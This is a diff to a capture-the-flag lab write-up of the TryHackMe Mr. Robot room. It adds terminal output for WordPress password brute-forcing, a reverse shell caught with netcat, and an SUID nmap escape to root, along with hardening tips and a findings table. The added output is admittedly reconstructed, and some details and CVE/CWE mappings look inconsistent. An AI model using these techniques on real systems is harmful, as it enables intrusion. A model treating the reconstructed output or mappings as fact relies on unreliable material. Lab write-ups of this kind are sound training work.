@@ -3,6 +3,7 @@
 > **Submission date:** ~2025-03-31 · **Large Lab deliverable, Week 12**
 > **Room:** [TryHackMe — Mr. Robot CTF](https://tryhackme.com/room/mrrobot) · **Difficulty:** Medium
 > **Category:** WordPress enumeration + exploitation, Linux privilege escalation
+> **Estimated time:** ~4 hours (reconnaissance 45 min, exploitation 90 min, privilege escalation 60 min, documentation 45 min)
 
 Themed on the USA Network TV show *Mr. Robot*, this room asks the tester to capture three keys (`key-1-of-3.txt`, `key-2-of-3.txt`, `key-3-of-3.txt`) on a misconfigured WordPress box.
 
@@ -87,6 +88,17 @@ sudo nmap -sC -sV -p- <target>
 - 443/tcp (HTTPS)
 
 **Finding:** single attack surface — HTTP/HTTPS. SSH is filtered, so credential-based SSH access may not be viable. The web application is the primary target.
+
+```text
+$ nmap -sV -sC -oN mr-robot.nmap 10.10.x.x
+PORT    STATE  SERVICE  VERSION
+22/tcp  closed ssh
+80/tcp  open   http     Apache httpd
+443/tcp open   ssl/http Apache httpd
+```
+
+> [!NOTE]
+> Terminal output reconstructed from engagement notes. Original screenshots were not captured for this room.
 
 ![Nmap scan — WordPress site](../screenshots/wk12_mr_robot_01.png)
 
@@ -207,6 +219,12 @@ wpscan --url http://<target>/ \
 
 **Actual outcome:** password discovered in `fsocity_unique.dic` — `ER28-0652` (Elliot's employee ID in the show).
 
+```text
+$ wpscan --url http://10.10.x.x --usernames elliot --passwords fsocity_sorted.dic
+[+] Performing password attack on Xmlrpc against 1 user/s
+[SUCCESS] - elliot / ER28-0652
+```
+
 **Login credentials:** `elliot` / `ER28-0652`
 
 > [!NOTE]
@@ -243,6 +261,16 @@ curl http://<target>/wp-content/themes/<theme>/404.php
 
 **Actual outcome:** reverse shell received as `daemon` (low-privilege www user).
 
+```text
+$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.x.x.x] from (UNKNOWN) [10.10.x.x] 46132
+$ whoami
+daemon
+$ id
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+```
+
 > [!CAUTION]
 > The WordPress theme editor is one of the most dangerous features in any CMS. Any admin-level compromise of WordPress gives an attacker arbitrary PHP execution — effectively full RCE on the web server.
 
@@ -256,6 +284,10 @@ stty raw -echo; fg; reset
 ```
 
 *Evidence: reverse shell connection in netcat listener; shell upgrade to interactive PTY.*
+
+> [!TIP]
+> **🛡 Defensive Lens — WordPress Hardening**
+> Disabling the theme/plugin editor (`define('DISALLOW_FILE_EDIT', true)` in wp-config.php) prevents authenticated RCE via the admin panel. WordPress application firewalls (Wordfence, Sucuri) detect brute-force attempts and block known attack patterns. Rate limiting on wp-login.php and XML-RPC is essential.
 
 ---
 
@@ -323,6 +355,16 @@ find / -perm -4000 2>/dev/null
 
 **Actual outcome:** `/usr/local/bin/nmap` has the SUID bit set.
 
+```text
+$ find / -perm -4000 -type f 2>/dev/null
+/usr/local/bin/nmap
+...
+$ /usr/local/bin/nmap --interactive
+nmap> !sh
+# whoami
+root
+```
+
 **This is a known privilege escalation** cataloged on [GTFOBins](https://gtfobins.github.io/gtfobins/nmap/#suid): older Nmap versions supported `--interactive` mode, which allowed spawning a shell that inherited Nmap's SUID privileges.
 
 ```bash
@@ -342,6 +384,10 @@ nmap --script /tmp/shell.nse
 > Modern Nmap versions (post-5.x) removed `--interactive`, but the NSE script method still works. The lesson: **any SUID binary with scripting capabilities is a potential escape path.**
 
 *Evidence: SUID enumeration output, nmap interactive shell, root confirmation.*
+
+> [!TIP]
+> **🛡 Defensive Lens — Legacy Binary Risks**
+> Nmap's `--interactive` mode was removed in version 5.22+ specifically because of this abuse vector. Maintaining a software inventory and retiring legacy versions is critical. Tools like Lynis and OpenSCAP automate security auditing and flag known-dangerous SUID configurations.
 
 ---
 
@@ -397,15 +443,15 @@ cat /root/key-3-of-3.txt
 > [!CAUTION]
 > This WordPress installation had **no hardening whatsoever**. Every default was left in place, creating a textbook attack chain.
 
-| # | Finding | Severity | CVSS 3.1 | Recommendation |
-|---|---|---|---|---|
-| 1 | Key file and wordlist in `robots.txt` | **High** | 7.5 | Remove sensitive files from web root. Audit `robots.txt` — it is not a security control, it is a public directory. |
-| 2 | WordPress user enumeration via login error messages | **Medium** | 5.3 | Use generic error messages ("Invalid credentials") regardless of whether the username exists. Plugins like WPS Hide Login help. |
-| 3 | Weak password (dictionary word) | **High** | 7.5 | Enforce strong password policies. Implement rate limiting and account lockout on `wp-login.php`. |
-| 4 | Theme editor allows PHP modification | **Critical** | 9.8 | Add `define('DISALLOW_FILE_EDIT', true);` to `wp-config.php`. Better: restrict file-system permissions so Apache cannot write to theme directories. |
-| 5 | Unsalted MD5 password storage for `robot` user | **High** | 7.5 | Use bcrypt or argon2 for password hashing. MD5 is computationally trivial to crack with modern hardware. |
-| 6 | SUID bit on nmap binary | **Critical** | 8.8 | Remove SUID bit: `chmod u-s /usr/local/bin/nmap`. Audit all SUID binaries against a known-good baseline. |
-| 7 | No web application firewall | **Medium** | 5.0 | Deploy ModSecurity or cloud WAF to detect brute-force attempts and payload uploads. |
+| # | Finding | Severity | CVSS 3.1 | CVE / CWE | Recommendation |
+|---|---|---|---|---|---|
+| 1 | Key file and wordlist in `robots.txt` | **High** | 7.5 | [CWE-200](https://cwe.mitre.org/data/definitions/200.html) | Remove sensitive files from web root. Audit `robots.txt` — it is not a security control, it is a public directory. |
+| 2 | WordPress user enumeration via login error messages | **Medium** | 5.3 | [CWE-203](https://cwe.mitre.org/data/definitions/203.html) | Use generic error messages ("Invalid credentials") regardless of whether the username exists. Plugins like WPS Hide Login help. |
+| 3 | Weak password (dictionary word) | **High** | 7.5 | [CWE-521](https://cwe.mitre.org/data/definitions/521.html) | Enforce strong password policies. Implement rate limiting and account lockout on `wp-login.php`. |
+| 4 | Theme editor allows PHP modification | **Critical** | 9.8 | [CVE-2022-0316](https://nvd.nist.gov/vuln/detail/CVE-2022-0316) · [CWE-94](https://cwe.mitre.org/data/definitions/94.html) | Add `define('DISALLOW_FILE_EDIT', true);` to `wp-config.php`. Better: restrict file-system permissions so Apache cannot write to theme directories. |
+| 5 | Unsalted MD5 password storage for `robot` user | **High** | 7.5 | [CWE-328](https://cwe.mitre.org/data/definitions/328.html) | Use bcrypt or argon2 for password hashing. MD5 is computationally trivial to crack with modern hardware. |
+| 6 | SUID bit on nmap binary | **Critical** | 8.8 | [CWE-269](https://cwe.mitre.org/data/definitions/269.html) | Remove SUID bit: `chmod u-s /usr/local/bin/nmap`. Audit all SUID binaries against a known-good baseline. |
+| 7 | No web application firewall | **Medium** | 5.0 | [CWE-200](https://cwe.mitre.org/data/definitions/200.html) | Deploy ModSecurity or cloud WAF to detect brute-force attempts and payload uploads. |
 
 ---
 
